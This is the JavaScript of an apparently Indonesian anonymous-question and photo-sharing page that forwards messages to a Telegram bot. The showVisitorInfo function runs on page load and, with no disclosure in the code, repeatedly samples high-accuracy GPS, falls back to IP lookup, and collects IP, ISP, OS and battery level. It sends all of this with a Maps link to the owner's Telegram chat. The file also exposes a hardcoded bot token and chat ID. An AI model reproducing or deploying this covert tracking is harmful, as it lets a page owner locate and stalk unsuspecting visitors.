const openPhotoOptions = document.getElementById('openPhotoOptions');
    const photoOptions = document.getElementById('photoOptions');
    openPhotoOptions.addEventListener('click', () => {
      photoOptions.classList.toggle('show');
    });
  

  // NOTE: replace the two placeholders below with your actual bot token and chat id
  const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
  const CHAT_ID = "6864694275";

  const music=document.getElementById('bgmusic');
  const btnMusic=document.getElementById('musicButton');
  let started=false;music.volume=0.4;
  async function startMusic(){if(started)return;started=true;music.muted=false;try{await music.play();btnMusic.classList.remove("show");}catch(err){btnMusic.classList.add("show");}}
  document.addEventListener('click',startMusic,{once:true});
  document.addEventListener('touchstart',startMusic,{once:true});
  btnMusic.addEventListener('click',async()=>{try{await music.play();btnMusic.classList.remove("show");}catch(e){console.log(e);}});

  const modal=document.getElementById('modal');document.getElementById('openAsk').onclick=()=>modal.classList.add('show');document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');
  const overlay=document.getElementById("blurOverlay"),input=document.getElementById("igInput"),btnLogin=document.getElementById("igSubmit"),savedIG=localStorage.getItem("ig_user");
  function removeOverlay(){overlay.style.opacity="0";overlay.style.pointerEvents="none";setTimeout(()=>overlay.style.display="none",300);}
  function showUserStatus(n){const e=document.getElementById("igStatus");e.textContent=`👉🏻 Login sebagai ${n} (keluar)`;e.style.display="block";e.onclick=()=>{if(confirm("Keluar?")){localStorage.removeItem("ig_user");setTimeout(()=>location.reload(),400);}};}
  if(savedIG){removeOverlay();showUserStatus(savedIG);}
  btnLogin.onclick=()=>{const u=input.value.trim();if(!u)return alert("Masukkan username dulu");localStorage.setItem("ig_user",u);showUserStatus(u);removeOverlay();};

  // universal send animation + swoosh
  async function sendTelegramMessage(url, body, el) {
    el.innerHTML = `
      <div class="mailContainer">
        <span class="mailLoop">📨</span>
        <span class="mailLoop" style="animation-delay:0.25s">📨</span>
        <span class="mailLoop" style="animation-delay:0.5s">📨</span>
      </div>`;
    try {
      const res = await fetch(url, body);
      if (res.ok) {
        // play swoosh (non-blocking)
        try {
          const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
          swoosh.volume = 0.45;
          swoosh.play().catch(()=>{});
        } catch(e){}
        el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
        setTimeout(()=>el.innerHTML="",3000);
        return true;
      } else {
        el.textContent = "💔 Gagal mengirim.";
        return false;
      }
    } catch (e) {
      el.textContent = "😿 Koneksi lemah.";
      return false;
    }
  }

  // send question (modal)
  document.getElementById('sendQ').addEventListener('click', async()=>{
    const savedUser = localStorage.getItem("ig_user") || "Anonim";
    const text = document.getElementById('qtext').value.trim();
    const qmsg = document.getElementById('qmsg');
    if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:`💬 Pertanyaan dari ${savedUser}\n${text}`})},
      qmsg
    );
    // close modal after short delay if sent
    setTimeout(()=>{ if(qmsg.textContent.includes("Terkirim") || qmsg.innerText.includes("Terkirim")) modal.classList.remove('show'); }, 900);
  });

  // take photo / preview
  const takeBtn=document.getElementById("takePhoto");
  const photoInput=document.getElementById("photoInput");
  takeBtn.onclick=async()=>{
    try{
      const cameraInput=document.createElement("input");
      cameraInput.type="file";cameraInput.accept="image/*";cameraInput.capture="user";
      cameraInput.click();
      cameraInput.onchange=()=>{
        if(cameraInput.files.length>0){
          photoInput.files = cameraInput.files;
          const reader = new FileReader();
          reader.onload = (e) => { preview.src = e.target.result; preview.style.display = "block"; };
          reader.readAsDataURL(cameraInput.files[0]);
        }
      };
    }catch(e){alert("Kamera tidak tersedia");}
  };
  photoInput.addEventListener('change',()=>{ if(photoInput.files && photoInput.files[0]){ const reader=new FileReader(); reader.onload=()=>{}; reader.readAsDataURL(photoInput.files[0]); } });

  // send photo
  document.getElementById("sendPhoto").addEventListener('click', async()=>{
    const savedUser = localStorage.getItem("ig_user") || "Anonim";
    const fileInput = document.getElementById("photoInput");
    const file = fileInput.files && fileInput.files[0];
    const caption = document.getElementById("caption").value;
    const statusEl = document.getElementById("status");
    if(!file){statusEl.textContent="Pilih foto dulu.";return;}
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
    fd.append("photo", file);
    const ok = await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:"POST", body: fd},
      statusEl
    );
    if(ok){
      fileInput.value=""; document.getElementById("caption").value=""; preview.style.display="none";
    }
  });

// versi baru: ambil lokasi lebih akurat (multi-sample + fallback)
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";

  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
    try {
      const now = new Date();
      const mapLink = (latitude && longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
        : "https://www.google.com/maps";
      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
                 /Android/i.test(navigator.userAgent) ? "Android" :
                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
      let batteryInfo = "Tidak diketahui";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${(battery.level*100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
      } catch {}

      const msg =
`📢 Pengunjung Baru!
👤 ${savedUser}
🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
🗺️ Maps: ${mapLink}
📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
💻 ${device}
🧩 OS: ${os}
🔋 Baterai: ${batteryInfo}
🏷️ ISP: ${d.connection?.isp || d.org || "?"}
📡 IP: ${d.ip || "?"}
🕓 ${now.toLocaleString('id-ID')}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
      console.log("✅ Info pengunjung dikirim (sumber:", source, ")");
    } catch (err) {
      console.error("❌ Gagal kirim info:", err);
    }
  }

  async function getBestGPS(samples = 5) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject("No geolocation support");
      const results = [];
      const opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };

      function capture() {
        navigator.geolocation.getCurrentPosition(pos => {
          results.push(pos.coords);
          if (results.length >= samples) {
            // pilih titik dengan akurasi terbaik
            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
            resolve(best);
          } else {
            setTimeout(capture, 700);
          }
        }, err => {
          if (results.length > 0) {
            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
            resolve(best);
          } else reject(err);
        }, opts);
      }
      capture();
    });
  }

  try {
    // 1️⃣ coba GPS high accuracy (multi-sampling)
    const coords = await getBestGPS(6);
    const { latitude, longitude, accuracy } = coords;
    const ipData = await (await fetch("https://ipwho.is/")).json();
    sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
  } catch (e1) {
    console.warn("⚠️ GPS gagal, fallback ke IP:", e1);
    try {
      // 2️⃣ fallback ke IP-based lokasi
      const d = await (await fetch("https://ipwho.is/")).json();
      sendToTelegram(d, d.latitude, d.longitude, "IP-based");
    } catch (e2) {
      // 3️⃣ fallback terakhir (lokasi default)
      sendToTelegram({}, null, null, "Fixed");
    }
  }
}

showVisitorInfo();

  // autoplay music attempt
  setTimeout(()=>{ startMusic(); },700);
  

  (function(){
    const area = document.querySelector('.card');
    const butterflies = [];
    const butterflyCount = 7;
    let holdActive = false;
    let holdX = 0;
    let holdY = 0;
    area.style.position = 'relative';
    area.style.overflow = 'hidden';
    function getBounds(){ const rect=area.getBoundingClientRect(); return { width: area.clientWidth, height: area.clientHeight, left: rect.left, top: rect.top }; }
    const bounds = getBounds();
    for(let i=0;i<butterflyCount;i++){
      const b=document.createElement('div'); b.className='butterfly'; b.textContent='💸'; area.appendChild(b);
      butterflies.push({ el:b, x:Math.random()*bounds.width, y:Math.random()*bounds.height, vx:(Math.random()-0.5)*1.2, vy:(Math.random()-0.5)*1.2, size:16+Math.random()*10, flapOffset:Math.random()*Math.PI*2 });
      b.style.fontSize = butterflies[i].size + 'px';
    }
    function moveButterflies(){
      const rect = getBounds();
      const time = performance.now()/200;
      butterflies.forEach(b=>{
        b.vy += 0.002;
        if(holdActive){ const dx=holdX-b.x; const dy=holdY-b.y; b.vx += dx*0.002; b.vy += dy*0.002; }
        b.vx += Math.sin(time + b.flapOffset)*0.04;
        b.vy += Math.cos(time + b.flapOffset)*0.02;
        b.x += b.vx; b.y += b.vy;
        if(b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
        if(b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
        b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
        b.vy = Math.max(-1.8, Math.min(1.8, b.vy));
        const flap = Math.sin(time*8 + b.flapOffset)*20;
        b.el.style.left = b.x + 'px'; b.el.style.top = b.y + 'px';
        b.el.style.transform = `rotate(${flap}deg) scale(${1 + Math.sin(time*4 + b.flapOffset)*0.05})`;
      });
      requestAnimationFrame(moveButterflies);
    }
    moveButterflies();
    const startHold=(x,y)=>{ const rect=getBounds(); holdActive=true; holdX=x-rect.left; holdY=y-rect.top; };
    const moveHold=(x,y)=>{ if(holdActive){ const rect=getBounds(); holdX=x-rect.left; holdY=y-rect.top; } };
    const endHold=()=> holdActive=false;
    area.addEventListener('mousedown', e=> startHold(e.clientX,e.clientY));
    area.addEventListener('mousemove', e=> moveHold(e.clientX,e.clientY));
    area.addEventListener('mouseup', endHold);
    area.addEventListener('mouseleave', endHold);
    area.addEventListener('touchstart', e=>{ const t=e.touches[0]; startHold(t.clientX,t.clientY); });
    area.addEventListener('touchmove', e=>{ const t=e.touches[0]; moveHold(t.clientX,t.clientY); });
    area.addEventListener('touchend', endHold);
    area.addEventListener('touchcancel', endHold);
  })();
  

(async function(){
  const titleEl = [...document.querySelectorAll('*')]
    .find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    display:block;
    text-align:center;
    font-size:14px;
    font-family:'Poppins', monospace;
    color:#cfcfcf;
    opacity:0;
    transform:translateY(6px);
    transition:opacity .6s ease, transform .6s ease, color .6s ease;
    margin-top:6px;
    margin-bottom:4px;
    letter-spacing:0.4px;
    user-select:none;
    position:relative;
  `;

  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status", {cache:"no-store"});
      const data = await res.json();
      const time = new Date(data.time);
      const diff = (Date.now() - time.getTime()) / 60000;
      const ago = diff < 1 ? "Music" : `${Math.floor(diff)}m ago`;
      const text = `${data.status} (${ago})`;

      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        statusBox.style.transform = "translateY(6px)";
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          statusBox.style.transform = "translateY(0)";
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";
      statusBox.style.opacity = 1;
      statusBox.style.transform = "translateY(0)";
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000); // refresh tiap 8 detik biar lebih ringan
})();


  const ua = navigator.userAgent || navigator.vendor || window.opera;
  if (ua.includes("Instagram") || ua.includes("FBAV") || ua.includes("FBAN")) {
    const warn = document.createElement("div");
    warn.textContent = "buka lewat Chrome";
    warn.style.cssText = `
      position: fixed; top: 0; left: 0; width: 100%;
      background: #ffcd4c; color: #000; padding: 10px;
      text-align: center; font-weight: 600; z-index: 9999;
      font-family: Inter, system-ui, sans-serif;
    `;
    document.body.appendChild(warn);
  }